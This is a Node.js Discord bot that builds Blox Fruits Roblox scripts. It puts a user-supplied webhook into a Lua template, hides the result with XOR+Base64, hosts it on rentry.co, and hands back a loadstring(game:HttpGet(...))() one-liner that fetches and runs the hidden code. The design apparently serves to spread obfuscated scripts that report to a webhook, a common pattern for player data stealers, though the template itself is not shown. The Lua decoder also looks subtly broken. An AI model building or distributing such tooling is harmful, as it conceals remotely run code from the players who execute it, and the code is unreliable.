const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const express = require('express');
require('dotenv').config();

// ----- Web server (health check & self-ping) -----
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is alive!'));
app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));

// ----- Self‑ping (keep Render awake) -----
const RENDER_URL = process.env.RENDER_EXTERNAL_URL || process.env.RENDER_URL;
if (RENDER_URL) {
    console.log(`🔁 Self‑ping enabled: ${RENDER_URL}`);
    setInterval(() => axios.get(RENDER_URL).catch(() => {}), 4 * 60 * 1000);
    setTimeout(() => axios.get(RENDER_URL).catch(() => {}), 5000);
} else {
    console.log('⚠️ Self‑ping disabled – bot may sleep.');
}

// ----- Discord Bot -----
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    const command = new SlashCommandBuilder()
        .setName('script')
        .setDescription('Generate a Blox Fruits script with your webhook')
        .addStringOption(option =>
            option.setName('game')
                .setDescription('Game name (only "bloxfruits" for now)')
                .setRequired(true)
                .addChoices({ name: 'Blox Fruits', value: 'bloxfruits' }))
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Your Discord username (for tracking)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Your Discord webhook URL')
                .setRequired(true));

    client.application.commands.create(command);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName !== 'script') return;

    await interaction.deferReply({ ephemeral: true });

    const game = interaction.options.getString('game');
    const username = interaction.options.getString('username');
    const webhook = interaction.options.getString('webhook');

    if (game !== 'bloxfruits') {
        return interaction.editReply({ content: '❌ Only "bloxfruits" is supported right now.' });
    }
    if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
        return interaction.editReply({ content: '❌ Invalid Discord webhook URL.' });
    }

    try {
        // Read template
        const templatePath = path.join(__dirname, 'template.lua');
        if (!fs.existsSync(templatePath)) {
            return interaction.editReply({ content: '❌ Template file `template.lua` not found.' });
        }
        let template = fs.readFileSync(templatePath, 'utf8');
        template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
        template = template.replace(/\{\{USERNAME\}\}/g, username);

        // Obfuscate
        const obfuscated = obfuscateScript(template);

        // ----- Upload to Rentry.co with a custom URL slug -----
        const slug = `exodus_${Date.now()}`; // unique slug
        const rentryRes = await axios.post(
            'https://rentry.co/api/new',
            {
                text: obfuscated,
                url: slug  // include this to satisfy "required" field
            },
            {
                timeout: 15000,
                headers: { 'Content-Type': 'application/json' }
            }
        );

        // Check for errors in response
        if (rentryRes.data && rentryRes.data.status && rentryRes.data.status !== '200') {
            const errorMsg = rentryRes.data.content || rentryRes.data.errors || 'Unknown error';
            throw new Error(`Rentry error (${rentryRes.data.status}): ${errorMsg}`);
        }

        if (!rentryRes.data || !rentryRes.data.url) {
            throw new Error('Rentry returned no URL. Response: ' + JSON.stringify(rentryRes.data));
        }

        const rawUrl = `https://rentry.co/raw/${slug}`; // we can use the slug we set
        const loadstringLine = `loadstring(game:HttpGet("${rawUrl}"))()`;

        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('✅ Script Generated')
            .setDescription(`**Game:** ${game}\n**User:** ${username}`)
            .addFields(
                { name: '📜 Loadstring', value: `\`\`\`lua\n${loadstringLine}\n\`\`\``, inline: false },
                { name: '📦 Hosted on', value: 'Rentry.co (never expires)', inline: false },
                { name: '🔒 Obfuscation', value: 'XOR + Base64', inline: false }
            )
            .setTimestamp();

        await interaction.editReply({ embeds: [embed] });

    } catch (error) {
        console.error(error);
        await interaction.editReply({
            content: '❌ Failed to generate script: ' + error.message
        });
    }
});

// ----- Obfuscator (XOR + Base64) -----
function obfuscateScript(raw) {
    const key = Math.floor(Math.random() * 254) + 1;
    let xorEncoded = '';
    for (let i = 0; i < raw.length; i++) {
        xorEncoded += String.fromCharCode(raw.charCodeAt(i) ^ key);
    }
    const base64 = Buffer.from(xorEncoded, 'binary').toString('base64');
    return `-- Obfuscated with XOR + Base64
local function decode(str, key)
    local result = ""
    for i = 1, #str do
        result = result .. string.char(string.byte(str, i) ~ key)
    end
    return result
end

local encoded = "${base64}"
local key = ${key}
local decoded = decode(encoded, key)
loadstring(decoded)()
`;
}

client.login(process.env.DISCORD_TOKEN);
